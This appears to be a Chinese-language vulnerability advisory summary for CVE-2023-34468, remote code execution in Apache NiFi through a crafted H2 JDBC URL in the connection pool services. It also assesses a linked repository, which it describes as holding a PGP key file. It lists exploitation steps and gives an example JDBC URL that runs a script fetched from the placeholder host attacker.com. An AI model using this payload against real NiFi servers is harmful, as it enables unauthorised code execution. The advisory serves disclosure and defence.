## CVE-2023-34468-Apache NiFi-远程代码执行

**漏洞编号:** CVE-2023-34468

**漏洞类型:** 远程代码执行

**影响应用:** Apache NiFi

**危害等级:** 高危，可导致完全系统控制

**影响版本:** <= 1.21.0

**利用条件:** 需要经过身份验证和授权的用户，并且能够配置数据库连接池服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34468 漏洞存在于 Apache NiFi 的 DBCPConnectionPool 和 HikariCPConnectionPool 控制器服务中。经过身份验证和授权的用户可以通过配置包含 H2 驱动程序的恶意数据库 URL 来执行任意代码。根据漏洞信息和搜索结果，该漏洞的利用方式如下：

1.  **漏洞原理：** 利用 H2 数据库的 JDBC URL 中可以嵌入可执行代码的特性，攻击者构造特殊的 JDBC URL，当 NiFi 尝试连接该数据库时，H2 数据库会执行 URL 中包含的恶意代码。
2.  **利用条件：** 需要攻击者具备有效的 NiFi 用户凭据，并且该用户拥有配置控制器服务的权限。攻击者需要能够修改或创建 DBCPConnectionPool 或 HikariCPConnectionPool 服务。
3.  **利用步骤：**
    *   攻击者登录 NiFi Web UI。
    *   攻击者创建一个新的或修改一个现有的 DBCPConnectionPool 或 HikariCPConnectionPool 控制器服务。
    *   在数据库 URL 配置项中，攻击者输入包含恶意代码的 H2 JDBC URL。 例如：`jdbc:h2:mem:testdb;INIT=RUNSCRIPT from 'http://attacker.com/exploit.sql'`
    *   攻击者启用该控制器服务。
    *   当 NiFi 尝试连接数据库时，H2 数据库会执行 `exploit.sql` 中的恶意代码，导致远程代码执行。

**关于提供的漏洞利用代码：**

提供的代码看起来像是 Apache NiFi 开发者的 PGP 密钥文件，通常用于验证软件发布的签名。这本身并不是漏洞利用代码，而是软件开发过程中的安全措施。虽然密钥泄露可能导致其他类型的攻击，但在此上下文中，它与 CVE-2023-34468 的直接利用无关。

**关于投毒风险：**

此文件中存在投毒代码的可能性较低，大约10%。文件内容主要是PGP公钥信息，目的是为了身份验证和确保软件的完整性。虽然不能完全排除人为投毒的可能性，但是这种可能性相对较低。风险主要来自于密钥本身是否被恶意利用，而非直接的代码层面上的投毒。

**项目地址:** [shoucheng3/asf__nifi_CVE-2023-34468_1-21-0](https://github.com/shoucheng3/asf__nifi_CVE-2023-34468_1-21-0)

**漏洞详情:** [CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468)